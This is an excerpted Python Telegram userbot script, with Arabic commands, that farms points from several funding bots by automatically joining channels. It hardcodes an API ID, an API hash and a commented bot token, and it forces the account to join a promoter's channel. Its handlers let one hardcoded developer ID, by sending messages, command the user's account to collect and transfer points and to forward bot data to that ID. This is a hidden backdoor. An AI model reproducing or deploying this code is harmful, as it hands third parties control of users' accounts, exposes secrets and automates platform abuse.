...
import random
APP_ID =21008736
APP_HASH='0958c7060d8f14e3d96e75b805d70071'
#bot_token='6978727700:AAHIckXTKkL8p1hWX2VJT0_Uv8pX1YSnCiY'
...
bot_username4='@MHDN313bot'
bot_username5='@cn2bot'
bot_username6='@ihyberbot'
bot_username7='@srwry2bot'
LOGS = logging.getLogger(__name__)
DEVS = [6507795159]
onerabbas_id = 6507795159
...
async def join_channel(event):
	try :
		await abbas(JoinChannelRequest('@source_ahmed'))
...
• بوت تمويل مهدويون  - `.تجميع مهدويون`
• بوت تمويل اسيا - `.تجميع اسيا`
• بوت تمويل هايبر - `.تجميع هايبر`
• بوت تمويل اليمن  - `.تجميع اليمن` 
• فحص السورس      - `.فحص`**""")
...
`.مهدويون` :   تجميع نقاط بوت مهدويون
`.اسيا` :   تجميع نقاط بوت اسيا
`.هايبر` :   تجميع نقاط بوت هايبر
`.اليمن` :   تجميع نقاط بوت اليمن
...
async def OwnerStart(event):
    ...
    if sender.id == onerabbas_id:
        ...
        joinu = await abbas(JoinChannelRequest('source_ahmed'))
        ...
        for i in range(100):
            ...
            if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
                await ahmed1.send_message(event.chat_id, f"تم الانتهاء من التجميع | SH")
                break
...
@abbas.on(events.NewMessage(outgoing=False, pattern='.مهدويون'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == onerabbas_id:
        await event.reply("جاري تجميع النقاط")
...
@abbas.on(events.NewMessage(outgoing=False, pattern='.اليمن'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == onerabbas_id:
        await event.reply("جاري تجميع النقاط")
...
async def arab(event):
        ...
        for i in range(100):
            ...
            try:
                ...
                await event.edit(f"القناة رقم {chs}")
        await abbas.send_message(event.chat_id, f"تم الانتهاء من التجميع | SH\nعدد النقاط المجموعة: {chs}")
@abbas.on(events.NewMessage(outgoing=True, pattern='.تجميع مهدويون'))
async def arab(event):
        await event.reply("جاري تجميع النقاط")
        await event.edit("جاري تجميع النقاط")
        joinu = await abbas(JoinChannelRequest('source_ahmed'))
...
@abbas.on(events.NewMessage(outgoing=True, pattern='.تجميع اليمن'))
async def arab(event):
        await event.reply("جاري تجميع النقاط")
        await event.edit("جاري تجميع النقاط")
        joinu = await abbas(JoinChannelRequest('source_ahmed'))
...
@abbas.on(events.NewMessage(outgoing=False, pattern='.تحويل مهدويون (.*)'))
async def OwnerStart(event):
    pt = event.pattern_match.group(1) 
    sender = await event.get_sender()
    if sender.id == onerabbas_id :
...
@abbas.on(events.NewMessage(outgoing=False, pattern='.تحويل اليمن (.*)'))
async def OwnerStart(event):
    pt = event.pattern_match.group(1) 
    sender = await event.get_sender()
    if sender.id == onerabbas_id :
    ...
    while True:
        try:
           ...
           if sender.id == onerabbas_id:
               ...
               joinu = await abbas(JoinChannelRequest('source_ahmed'))
               channel_entity = await abbas.get_entity(pot)
               await abbas.send_message(pot, '**جاري بدأ عملية التجميع بواسطة احمد**')
               await abbas.send_message(pot, '/start')
...
async def OwnerStart(event):
    ...
    msg = await abbas.get_messages(bot_username3, limit=1)
    await msg[0].forward_to(onerabbas_id)
@abbas.on(events.NewMessage(outgoing=False, pattern=r'.معلومات مهدويون'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == onerabbas_id :
        send = await abbas.send_message(bot_username4, '/start')
...
@abbas.on(events.NewMessage(outgoing=False, pattern=r'.معلومات اليمن'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == onerabbas_id :
        send = await abbas.send_message(bot_username7, '/start')
...
async def OwnerStart(event):
    ...
    if sender.id == onerabbas_id:
        ...
        joion = await abbas(JoinChannelRequest('source_ahmed'))
...
async def Abbas(event):
    if event.message.message.startswith("تمويل") and event.sender_id in Devahmed:
